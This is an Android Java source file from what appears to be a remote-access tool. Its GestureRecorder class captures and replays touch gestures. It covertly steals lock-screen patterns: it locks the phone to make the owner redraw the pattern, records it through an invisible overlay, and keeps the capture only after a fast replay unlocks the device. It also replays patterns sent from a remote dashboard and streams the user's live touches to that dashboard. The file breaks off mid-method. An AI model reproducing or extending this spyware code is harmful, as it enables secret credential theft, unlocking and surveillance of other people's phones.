package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Display;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * GestureRecorder — record real touch gestures via an overlay, store locally per app,
 * and replay them using AccessibilityService.dispatchGesture().
 *
 * Storage: {filesDir}/gestures/{packageId}_{label}_{timestamp}.json
 * Each JSON file stores:
 *   { label, packageId, screenW, screenH, durationMs, points: [{id,action,x,y,t},...] }
 */
public class GestureRecorder {

    private static final String TAG      = "GestureRecorder";
    private static final String SUBDIR   = "gestures";
    private static final int    MAX_PTS  = 8000;

    private final Context            context;
    private final AccessibilityService accessSvc;
    private final WindowManager      wm;
    private final Handler            mainHandler;
    private final int                screenW;
    private final int                screenH;

    private volatile boolean       isRecording = false;
    private volatile boolean       isPaused    = false;
    private volatile RecordingOverlay overlay;

    // -- Static helper structs ------------------------------------------------

    private static class GesturePoint {
        int    pointerId;
        int    action;    // MotionEvent.ACTION_DOWN=0, MOVE=2, UP=1, POINTER_DOWN=5, POINTER_UP=6
        float  nx;        // normalized 0..1
        float  ny;        // normalized 0..1
        long   t;         // ms since recording start
        int    gestureId; // increments on each new touch-down — separates individual gestures
    }

    // -- Constructor ----------------------------------------------------------

    public GestureRecorder(Context context, AccessibilityService accessSvc) {
        this.context    = context;
        this.accessSvc  = accessSvc;
        this.wm         = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());

        WindowManager wm2 = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm2.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        this.screenW = size.x;
        this.screenH = size.y;

        File dir = gestureDir();
        if (!dir.exists()) dir.mkdirs();
    }

    // -- Public commands ------------------------------------------------------

    /** Start recording. Returns immediately; overlay is shown on main thread. */
    public JSONObject startRecording(String packageId, String label) {
        JSONObject r = new JSONObject();
        try {
            if (isRecording) {
                r.put("success", false);
                r.put("error", "Already recording — stop current recording first");
                return r;
            }
            String safeLabel = label == null || label.trim().isEmpty() ? "gesture" : label.trim().replaceAll("[^a-zA-Z0-9_\\-]", "_");
            String safePkg   = packageId == null ? "unknown" : packageId.replaceAll("[^a-zA-Z0-9._\\-]", "_");
            isRecording = true;
            CountDownLatch latch = new CountDownLatch(1);
            mainHandler.post(() -> {
                overlay = new RecordingOverlay(context, safePkg, safeLabel, screenW, screenH, wm, () -> isRecording = false);
                overlay.show();
                latch.countDown();
            });
            latch.await(2, TimeUnit.SECONDS);
            r.put("success", true);
            r.put("message", "Recording started for package: " + safePkg);
            r.put("label", safeLabel);
            r.put("screenW", screenW);
            r.put("screenH", screenH);
        } catch (Exception e) {
            Log.e(TAG, "startRecording: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Stop recording and save the gesture file. */
    public JSONObject stopRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false);
                r.put("error", "Not currently recording");
                return r;
            }
            isRecording = false;
            final JSONObject[] saved = {null};
            CountDownLatch latch = new CountDownLatch(1);
            final RecordingOverlay currentOverlay = overlay;
            mainHandler.post(() -> {
                saved[0] = currentOverlay.stopAndSave(gestureDir());
                overlay   = null;
                latch.countDown();
            });
            latch.await(3, TimeUnit.SECONDS);
            if (saved[0] != null) {
                r.put("success", true);
                r.put("result", saved[0]);

                // ── Auto-replay + verify ──────────────────────────────────────
                // Immediately replay the recorded gesture on the device.
                // After playback completes, check whether the device unlocked:
                //   • unlocked  → gesture was correct — keep the saved file
                //   • still locked → wrong gesture — delete the file silently
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && accessSvc != null) {
                    try {
                        String path = saved[0].optString("path", null);
                        if (path != null) {
                            File savedFile = new File(path);
                            JSONObject data = loadJson(savedFile);
                            if (data != null) {
                                JSONArray pts = data.getJSONArray("points");
                                int srcW = data.optInt("screenW", screenW);
                                int srcH = data.optInt("screenH", screenH);
                                long dur = data.optLong("durationMs", 500);
                                // Use fast builder — entire replay compressed to ≤30ms
                                GestureDescription gesture = buildFastGestureDescription(pts, srcW, srcH);
                                if (gesture != null) {
                                    replayThenDeleteIfLocked(savedFile, gesture, FAST_REPLAY_MS);
                                    r.put("replaying", true);
                                    r.put("replayNote", "Gesture replayed at ultra-speed — file kept only if device unlocks");
                                }
                            }
                        }
                    } catch (Exception replayEx) {
                        Log.e(TAG, "stopRecording replay trigger: " + replayEx.getMessage());
                    }
                }
            } else {
                r.put("success", false);
                r.put("error", "Failed to save gesture (no points recorded)");
            }
        } catch (Exception e) {
            Log.e(TAG, "stopRecording: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Cancel an in-progress recording without saving. */
    public JSONObject cancelRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            isRecording = false;
            final RecordingOverlay cur = overlay;
            mainHandler.post(() -> { cur.hide(); });
            overlay = null;
            r.put("success", true); r.put("message", "Recording cancelled");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Replay a saved gesture via AccessibilityService.dispatchGesture(). */
    public JSONObject replayGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
            }
            if (accessSvc == null) {
                r.put("success", false); r.put("error", "AccessibilityService not available"); return r;
            }
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "File not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Failed to parse gesture file"); return r;
            }
            JSONArray points = data.getJSONArray("points");
            int srcW = data.optInt("screenW", screenW);
            int srcH = data.optInt("screenH", screenH);
            GestureDescription gesture = buildGestureDescription(points, srcW, srcH);
            if (gesture == null) {
                r.put("success", false); r.put("error", "Could not build gesture — no strokes"); return r;
            }
            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
            r.put("success", ok);
            r.put("filename", filename);
            r.put("pointCount", points.length());
            if (!ok) r.put("error", "dispatchGesture returned false");
        } catch (Exception e) {
            Log.e(TAG, "replayGesture: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Replay a gesture and then, once it finishes, check whether the device
     * unlocked.  If the device is still locked after the gesture the saved
     * file is deleted — the gesture was wrong.  If the device is unlocked the
     * file is kept permanently.
     *
     * @param savedFile   the .json file that was just saved by stopAndSave()
     * @param gesture     pre-built GestureDescription to dispatch
     * @param gestureDurationMs total playback duration of the gesture in ms;
     *                    the lock check runs gestureDurationMs + 1 200 ms after
     *                    the gesture completes (gives Android time to animate
     *                    the unlock transition).
     */
    private void replayThenDeleteIfLocked(File savedFile,
                                          GestureDescription gesture,
                                          long gestureDurationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        if (accessSvc == null) return;

        long checkDelay = Math.max(800, gestureDurationMs) + 1200;

        accessSvc.dispatchGesture(gesture,
            new AccessibilityService.GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription g) {
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            KeyguardManager km = (KeyguardManager)
                                    context.getSystemService(Context.KEYGUARD_SERVICE);
                            boolean stillLocked = (km == null || km.isKeyguardLocked());
                            if (stillLocked) {
                                if (savedFile.exists() && savedFile.delete()) {
                                    Log.i(TAG, "replayThenDeleteIfLocked: gesture did NOT unlock device — file deleted: " + savedFile.getName());
                                }
                            } else {
                                Log.i(TAG, "replayThenDeleteIfLocked: device UNLOCKED — gesture saved: " + savedFile.getName());
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "replayThenDeleteIfLocked check: " + e.getMessage());
                        }
                    }, checkDelay);
                }

                @Override
                public void onCancelled(GestureDescription g) {
                    Log.w(TAG, "replayThenDeleteIfLocked: gesture cancelled by system — file kept");
                }
            }, null);
    }

    /** List all saved gestures. */
    public JSONObject listGestures() {
        JSONObject r = new JSONObject();
        try {
            File dir = gestureDir();
            JSONArray arr = new JSONArray();
            File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
            if (files != null) {
                for (File f : files) {
                    JSONObject meta = new JSONObject();
                    meta.put("filename", f.getName());
                    meta.put("sizeBytes", f.length());
                    meta.put("modifiedMs", f.lastModified());
                    // Extract packageId and label from filename: {pkg}_{label}_{ts}.json
                    String name = f.getName().replace(".json", "");
                    String[] parts = name.split("_", 3);
                    if (parts.length >= 2) {
                        meta.put("packageId", parts[0]);
                        meta.put("label", parts.length >= 3 ? parts[1] : parts[1]);
                    }
                    // Try to read point count from file header
                    try {
                        JSONObject data = loadJson(f);
                        if (data != null) {
                            meta.put("label",      data.optString("label", ""));
                            meta.put("packageId",  data.optString("packageId", ""));
                            meta.put("pointCount", data.optJSONArray("points") != null ? data.getJSONArray("points").length() : 0);
                            meta.put("durationMs", data.optLong("durationMs", 0));
                            meta.put("screenW",    data.optInt("screenW", 0));
                            meta.put("screenH",    data.optInt("screenH", 0));
                        }
                    } catch (Exception ignored) {}
                    arr.put(meta);
                }
            }
            r.put("success", true);
            r.put("gestures", arr);
            r.put("count", arr.length());
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Load full gesture data (including all points) for visualization. */
    public JSONObject getGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Parse error"); return r;
            }
            r.put("success", true);
            r.put("gesture", data);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Delete a saved gesture. */
    public JSONObject deleteGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            boolean deleted = file.delete();
            r.put("success", deleted);
            r.put("filename", filename);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    public boolean isRecording() { return isRecording; }
    public boolean isPaused()    { return isPaused; }

    /** Pause touch capture — overlay stays visible, points stop accumulating. */
    public JSONObject pauseRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            if (isPaused) {
                r.put("success", false); r.put("error", "Already paused"); return r;
            }
            isPaused = true;
            overlay.setPaused(true);
            r.put("success", true); r.put("message", "Recording paused");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Resume touch capture after pause. */
    public JSONObject resumeRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            if (!isPaused) {
                r.put("success", false); r.put("error", "Not paused"); return r;
            }
            isPaused = false;
            overlay.setPaused(false);
            r.put("success", true); r.put("message", "Recording resumed");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Return a snapshot of the live (in-progress) gesture points for dashboard preview.
     * Returns up to the last 500 points so the payload stays small.
     */
    public JSONObject getLivePoints() {
        JSONObject r = new JSONObject();
        try {
            r.put("recording", isRecording);
            r.put("paused",    isPaused);
            if (!isRecording || overlay == null) {
                r.put("success", true);
                r.put("points", new JSONArray());
                r.put("pointCount", 0);
                return r;
            }
            JSONArray snapshot = overlay.getPointsSnapshot(500);
            r.put("success",    true);
            r.put("points",     snapshot);
            r.put("pointCount", snapshot.length());
            r.put("screenW",    screenW);
            r.put("screenH",    screenH);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // -- Internal helpers -----------------------------------------------------

    private File gestureDir() {
        return new File(context.getFilesDir(), SUBDIR);
    }

    private JSONObject loadJson(File file) {
        try (FileReader fr = new FileReader(file)) {
            StringBuilder sb = new StringBuilder();
            char[] buf = new char[4096];
            int n;
            while ((n = fr.read(buf)) != -1) sb.append(buf, 0, n);
            return new JSONObject(sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "loadJson: " + e.getMessage());
            return null;
        }
    }

    /**
     * Build GestureDescription from recorded points with all timing compressed
     * into a [0, TARGET_MS] window so the replay is imperceptibly fast.
     * Same coordinate mapping as buildGestureDescription(); only timing differs.
     */
    private static final long FAST_REPLAY_MS = 80; // total playback window in ms (50–100ms target)

    private GestureDescription buildFastGestureDescription(JSONArray points, int srcW, int srcH) throws Exception {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return null;

        // ── 1. Parse points, same grouping as normal build ───────────────────
        Map<Integer, List<long[]>> strokes = new HashMap<>();
        long firstTime = -1;
        long lastTime  = 0;

        for (int i = 0; i < points.length(); i++) {
            JSONObject pt = points.getJSONObject(i);
            int action = pt.getInt("action");
            int pid    = pt.optInt("id", 0);
            long t     = pt.getLong("t");
            float sx   = Math.max(1, Math.min(screenW - 1, (float) pt.getDouble("nx") * screenW));
            float sy   = Math.max(1, Math.min(screenH - 1, (float) pt.getDouble("ny") * screenH));

            if (firstTime < 0) firstTime = t;
            long relT = t - firstTime;
            if (relT > lastTime) lastTime = relT;

            if (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_POINTER_DOWN || action == 5) {
                strokes.put(pid, new ArrayList<>());
            }
            List<long[]> pts = strokes.get(pid);
            if (pts == null) { pts = new ArrayList<>(); strokes.put(pid, pts); }
            pts.add(new long[]{ relT, (long) sx, (long) sy });
        }

        // ── 2. Compute scale factor to compress into FAST_REPLAY_MS ──────────
        // If the original was already shorter (e.g. a tap), scale = 1.0 (no stretch).
        double scale = (lastTime > FAST_REPLAY_MS)
                       ? (double) FAST_REPLAY_MS / lastTime
                       : 1.0;

        // ── 3. Build strokes with scaled timing ───────────────────────────────
        GestureDescription.Builder builder = new GestureDescription.Builder();
        boolean hasStroke = false;

        for (Map.Entry<Integer, List<long[]>> entry : strokes.entrySet()) {
            List<long[]> pts = entry.getValue();
            if (pts.isEmpty()) continue;

            long origStart = pts.get(0)[0];
            long origEnd   = pts.get(pts.size() - 1)[0];
            long scaledStart = Math.round(origStart * scale);
            long scaledDur   = Math.max(1, Math.round((origEnd - origStart) * scale));

            Path path = new Path();
            path.moveTo(pts.get(0)[1], pts.get(0)[2]);
            for (int i = 1; i < pts.size(); i++) {
                path.lineTo(pts.get(i)[1], pts.get(i)[2]);
            }

            builder.addStroke(new GestureDescription.StrokeDescription(path, scaledStart, scaledDur));
            hasStroke = true;
        }

        return hasStroke ? builder.build() : null;
    }

    /**
     * Build GestureDescription from recorded normalized points.
     * Groups points by pointerId and builds one StrokeDescription per stroke
     * (pointer-down to pointer-up segment).
     */
    private GestureDescription buildGestureDescription(JSONArray points, int srcW, int srcH) throws Exception {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return null;

        // Points are stored as normalized fractions (nx=rawX/srcW, ny=rawY/srcH).
        // To replay, simply multiply by the current device's screen dimensions.
        // No additional scale factor needed — the normalization already handles size differences.

        Map<Integer, List<long[]>> strokes = new HashMap<>(); // pointerId -> list of [t, x, y]

        long firstTime = -1;
        for (int i = 0; i < points.length(); i++) {
            JSONObject pt = points.getJSONObject(i);
            int action = pt.getInt("action");
            int pid    = pt.optInt("id", 0);
            long t     = pt.getLong("t");
            float nx   = (float) pt.getDouble("nx");
            float ny   = (float) pt.getDouble("ny");
            // Map normalized [0..1] fractions onto the current screen
            float sx   = nx * screenW;
            float sy   = ny * screenH;
            // clamp to screen bounds
            sx = Math.max(1, Math.min(screenW - 1, sx));
            sy = Math.max(1, Math.min(screenH - 1, sy));

            if (firstTime < 0) firstTime = t;
            long relT = t - firstTime;

            if (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_POINTER_DOWN || action == 5) {
                strokes.put(pid, new ArrayList<>());
            }
            List<long[]> pts = strokes.get(pid);
            if (pts == null) { pts = new ArrayList<>(); strokes.put(pid, pts); }
            pts.add(new long[]{ relT, (long) sx, (long) sy });
        }

        GestureDescription.Builder builder = new GestureDescription.Builder();
        boolean hasStroke = false;

        for (Map.Entry<Integer, List<long[]>> entry : strokes.entrySet()) {
            List<long[]> pts = entry.getValue();
            if (pts.size() < 1) continue;

            Path path = new Path();
            long startT = pts.get(0)[0];
            long endT   = pts.get(pts.size() - 1)[0];
            long dur    = Math.max(50, endT - startT);

            path.moveTo(pts.get(0)[1], pts.get(0)[2]);
            for (int i = 1; i < pts.size(); i++) {
                path.lineTo(pts.get(i)[1], pts.get(i)[2]);
            }

            builder.addStroke(new GestureDescription.StrokeDescription(path, startT, dur));
            hasStroke = true;
        }

        return hasStroke ? builder.build() : null;
    }

    // ── Service-touch auto-capture (no overlay window) ────────────────────────
    // Both auto-capture modes record via AccessibilityService.onTouchEvent()
    // so no overlay is needed and the user's input is never blocked.

    private volatile boolean       autoCapturing    = false;
    private volatile boolean       autoMirrorActive = false;

    // Points accumulated for the dashboard-started auto-capture session
    private final List<GesturePoint> servicePts     = new ArrayList<>();
    private volatile long            servicePtsStart = 0;

    // Points accumulated for the service-touch live stream (no overlay)
    private final List<GesturePoint> liveServicePts        = new ArrayList<>();
    private volatile long            liveServicePtsStart   = 0;
    private volatile int             liveCurrentGestureId  = 0; // increments on each ACTION_DOWN

    // -- Screen-lock auto-capture state (service-touch, no overlay) -----------
    private volatile boolean         lockCaptureEnabled = false;
    private volatile boolean         lockCaptureActive  = false;
    // Points for the gesture currently in progress on the lock screen
    private final List<GesturePoint> lockCurrentPts     = new ArrayList<>();
    private volatile long            lockCurrentStart    = 0;
    private final Handler            lockGestureHandler  = new Handler(Looper.getMainLooper());

    private BroadcastReceiver        screenStateReceiver;
    private volatile boolean         screenStateReceiverRegistered = false;

    /**
     * Draw a pattern from normalized node coordinates received from the dashboard.
     * Params JSON expected: { nodes: [{nx, ny}, ...], sequence: [int, ...] }
     * The pattern is executed as a single gesture stroke through all nodes.
     */
    public JSONObject drawPattern(JSONObject params) {
        JSONObject r = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
            }
            if (accessSvc == null) {
                r.put("success", false); r.put("error", "Accessibility service not running"); return r;
            }

            JSONArray nodes = params.optJSONArray("nodes");
            if (nodes == null || nodes.length() < 2) {
                r.put("success", false); r.put("error", "Need at least 2 nodes to draw a pattern"); return r;
            }

            // Detect screen size to map normalized coords
            android.graphics.Point sz = new android.graphics.Point();
            wm.getDefaultDisplay().getRealSize(sz);
            int curW = sz.x;
            int curH = sz.y;

            // Build a smooth path through the nodes with interpolated points
            Path path = new Path();
            long durationMs = 80L * nodes.length(); // ~80ms per node transition

            for (int i = 0; i < nodes.length(); i++) {
                JSONObject node = nodes.getJSONObject(i);
                float nx = (float) node.getDouble("nx");
                float ny = (float) node.getDouble("ny");
                float sx = Math.max(1, Math.min(curW - 1, nx * curW));
                float sy = Math.max(1, Math.min(curH - 1, ny * curH));
                if (i == 0) path.moveTo(sx, sy);
                else        path.lineTo(sx, sy);
            }

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(100, durationMs)));
            GestureDescription gesture = builder.build();

            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
            r.put("success", ok);
            r.put("nodeCount", nodes.length());
            r.put("durationMs", durationMs);
            if (!ok) r.put("error", "dispatchGesture returned false");
        } catch (Exception e) {
            Log.e(TAG, "drawPattern: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // ── Auto-capture idle watchdog ────────────────────────────────────────────
    private final Handler  idleWatchdogHandler = new Handler(Looper.getMainLooper());
    private volatile long  lastTouchMs         = 0;
    private static final long IDLE_TIMEOUT_MS  = 2 * 60 * 1000; // 2 minutes

    private final Runnable idleWatchdog = new Runnable() {
        @Override public void run() {
            if (!autoCapturing) return;
            long now  = System.currentTimeMillis();
            long idle = now - lastTouchMs;
            if (idle >= IDLE_TIMEOUT_MS) {
                Log.i(TAG, "Auto-capture idle timeout — auto-stopping after " + (idle / 1000) + "s");
                stopAutoCapture();
            } else {
                idleWatchdogHandler.postDelayed(this, 15_000);
            }
        }
    };

    /**
     * Start auto-capturing gestures via an invisible (silent) overlay.
     *
     * Behaviour:
     *  1. If the device is LOCKED → start the silent overlay immediately.
     *  2. If the device is UNLOCKED → lock the screen, wake it, press Recents,
     *     then wait for the screen to lock (BroadcastReceiver) before starting.
     *  3. Auto-stops after 2 minutes of no touch input.
     *  4. Sending gesture_auto_capture_stop from the dashboard also stops it.
     */
    public JSONObject startAutoCapture() {
        JSONObject r = new JSONObject();
        try {
            if (autoCapturing || isRecording) {
                r.put("success", false);
                r.put("error", "Auto-capture already running");
                return r;
            }

            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            boolean isLocked   = (km != null && km.isKeyguardLocked());

            if (!isLocked) {
                // Device is unlocked — lock it, wake it, press recents, then start capture
                // once the screen-lock broadcast arrives.
                r.put("success", true);
                r.put("locked_first", true);
                r.put("message", "Device was unlocked — locking screen and pressing recents first");

                mainHandler.post(() -> {
                    // ① Lock screen
                    if (accessSvc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        accessSvc.performGlobalAction(
                                AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    } else {
                        try {
                            android.app.admin.DevicePolicyManager dpm =
                                (android.app.admin.DevicePolicyManager) context.getSystemService(
                                        Context.DEVICE_POLICY_SERVICE);
                            if (dpm != null) dpm.lockNow();
                        } catch (Exception ex) {
                            Log.w(TAG, "lockNow fallback: " + ex.getMessage());
                        }
                    }
                });

                mainHandler.postDelayed(() -> {
                    // ② Wake screen
                    try {
                        android.os.PowerManager pm = (android.os.PowerManager)
                                context.getSystemService(Context.POWER_SERVICE);
                        if (pm != null) {
                            @SuppressWarnings("deprecation")
                            android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                    | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                                    "GestureRecorder:autocap_wake");
                            wl.acquire(3000);
                            wl.release();
                        }
                    } catch (Exception ex) {
                        Log.w(TAG, "wakelock: " + ex.getMessage());
                    }
                    // ③ Press recents
                    if (accessSvc != null) {
                        accessSvc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    }
                }, 600);

                // ④ Register a one-shot BroadcastReceiver to detect the screen locking.
                //    When ACTION_SCREEN_OFF fires, start the actual silent overlay.
                final BroadcastReceiver[] holder = {null};
                holder[0] = new BroadcastReceiver() {
                    @Override public void onReceive(Context ctx, Intent intent) {
                        if (!Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) return;
                        try { ctx.unregisterReceiver(holder[0]); } catch (Exception ignored) {}
                        // Small delay to let the lock screen fully appear
                        mainHandler.postDelayed(GestureRecorder.this::doStartAutoCapture, 500);
                    }
                };
                IntentFilter f = new IntentFilter(Intent.ACTION_SCREEN_OFF);
                context.registerReceiver(holder[0], f);
                return r;
            }

            // Device already locked — start capture immediately
            doStartAutoCapture();
            r.put("success", true);
            r.put("locked_first", false);
            r.put("message", "Auto-capture started — silent overlay active on lock screen");
        } catch (Exception e) {
            autoCapturing = false;
            isRecording   = false;
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Internal: actually create and show the silent auto-capture overlay. */
    private void doStartAutoCapture() {
        try {
            if (autoCapturing || isRecording) return;
            autoCapturing = true;
            isRecording   = true;
            lastTouchMs   = System.currentTimeMillis();
            String safeLabel = "auto_" + System.currentTimeMillis();
            mainHandler.post(() -> {
                overlay = new RecordingOverlay(
                        context, "auto", safeLabel, screenW, screenH, wm,
                        () -> { isRecording = false; autoCapturing = false; });
                overlay.setSilent(true);
                try {
                    overlay.show();
                    Log.i(TAG, "Auto-capture overlay shown (silent, invisible)");
                } catch (Exception e) {
                    Log.e(TAG, "doStartAutoCapture overlay.show: " + e.getMessage());
                    isRecording   = false;
                    autoCapturing = false;
                    overlay = null;
                }
            });
            // Start 2-min idle watchdog
            idleWatchdogHandler.removeCallbacks(idleWatchdog);
            idleWatchdogHandler.postDelayed(idleWatchdog, 15_000);
        } catch (Exception e) {
            Log.e(TAG, "doStartAutoCapture: " + e.getMessage());
            autoCapturing = false;
            isRecording   = false;
        }
    }

    /**
     * Stop auto-capture and save the recorded gesture.
     * Delegates to stopRecording() which handles the overlay teardown and file save.
     */
    public JSONObject stopAutoCapture() {
        JSONObject r = new JSONObject();
        try {
            idleWatchdogHandler.removeCallbacks(idleWatchdog);
            disableLockScreenAutoCapture();
            autoCapturing = false;

            if (!isRecording || overlay == null) {
                r.put("success", true);
                r.put("saved", false);
                r.put("message", "Auto-capture stopped (nothing was recording)");
                return r;
            }

            JSONObject result = stopRecording();
            r.put("success", true);
            boolean hasSaved = result.optBoolean("success", false) && result.has("result");
            r.put("saved", hasSaved);
            if (hasSaved) r.put("result", result.get("result"));
            else          r.put("message", result.optString("message", "Auto-capture stopped"));
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // =========================================================================
    // Live Stream — silent invisible overlay that streams interaction to dashboard
    // =========================================================================

    private volatile boolean       liveStreamActive = false;
    private volatile RecordingOverlay liveOverlay    = null;
    private String                 liveStreamFilename = null;

    /**
     * Start a live stream session — uses AccessibilityService touch events
     * (no blocking overlay) so the user can use the screen normally while
     * every touch is captured and streamed to the dashboard in real time.
     *
     * Each finger-down → finger-up is recorded as a separate gesture segment
     * (identified by gestureId) so individual taps, swipes, and draws are
     * kept distinct on the dashboard canvas.
     *
     * Dashboard polls gesture_live_points for real-time point data.
     * Call gesture_live_stop to save all collected gestures.
     */
    public JSONObject startLiveStream() {
        JSONObject r = new JSONObject();
        try {
            if (liveStreamActive) {
                r.put("success", false);
                r.put("error", "Live stream already active");
                return r;
            }
            // Clear any previous overlay if it lingered
            if (liveOverlay != null) {
                try { mainHandler.post(() -> liveOverlay.hide()); } catch (Exception ignored) {}
                liveOverlay = null;
            }
            // Reset service-touch buffer
            synchronized (liveServicePts) { liveServicePts.clear(); }
            liveCurrentGestureId = 0;
            liveServicePtsStart  = System.currentTimeMillis();
            liveStreamFilename   = null;
            // Activate service-touch capture — handleServiceTouchEvent() takes over
            liveStreamActive = true;
            // isRecording stays false — no overlay, nothing blocks the user
            r.put("success", true);
            r.put("message", "Live stream started (service-touch mode — screen fully usable)");
        } catch (Exception e) {
            liveStreamActive = false;
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Stop live stream and save the recorded interaction from the service-touch buffer. */
    public JSONObject stopLiveStream() {
        JSONObject r = new JSONObject();
        try {
            liveStreamActive = false;
            // Clean up any lingering overlay
            if (liveOverlay != null) {
                final RecordingOverlay cur = liveOverlay;
                liveOverlay = null;
                mainHandler.post(() -> { try { cur.hide(); } catch (Exception ignored) {} });
            }

            // Save from service-touch buffer
            List<GesturePoint> snapshot;
            synchronized (liveServicePts) {
                snapshot = new ArrayList<>(liveServicePts);
                liveServicePts.clear();
            }

            r.put("success", true);
            if (snapshot.isEmpty()) {
                r.put("saved", false);
                r.put("message", "Live stream stopped but no touches were recorded");
                return r;
            }

            // Build JSON and save to file (includes gestureId so dashboard can segment strokes)
            JSONArray arr = new JSONArray();
            long firstT = -1;
            for (GesturePoint gp : snapshot) {
                if (firstT < 0) firstT = gp.t;
                JSONObject p = new JSONObject();
                p.put("id",     gp.pointerId);
                p.put("action", gp.action);
                p.put("nx",     gp.nx);
                p.put("ny",     gp.ny);
                p.put("t",      gp.t);
                p.put("gid",    gp.gestureId);
                arr.put(p);
            }
            long durationMs = snapshot.isEmpty() ? 0
                    : (snapshot.get(snapshot.size() - 1).t - snapshot.get(0).t);

            String ts    = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String label = "live_" + ts;
            String fn    = "live_stream_" + ts + ".json";

            JSONObject data = new JSONObject();
            data.put("label",      label);
            data.put("packageId",  "live");
            data.put("screenW",    screenW);
            data.put("screenH",    screenH);
            data.put("durationMs", durationMs);
            data.put("recordedAt", System.currentTimeMillis());
            data.put("points",     arr);

